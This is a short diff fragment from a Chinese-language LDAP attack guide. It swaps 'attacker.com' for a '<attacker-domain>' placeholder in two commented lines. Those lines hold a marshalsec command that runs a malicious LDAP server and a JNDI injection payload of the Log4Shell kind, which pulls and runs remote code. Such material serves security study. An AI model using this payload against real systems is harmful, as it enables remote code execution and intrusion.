@@ -68,10 +68,10 @@ def ldap_blind_extract(target: str, attribute: str = "password"):
 
 # 恶意 LDAP 服务器 (marshalsec)
 # java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
-#   http://attacker.com/#Exploit 1389
+#   http://<attacker-domain>/#Exploit 1389
 
 # 注入 payload:
-# ${jndi:ldap://attacker.com:1389/Exploit}
+# ${jndi:ldap://<attacker-domain>:1389/Exploit}
 ```
 
 ## OpenLDAP 特定攻击
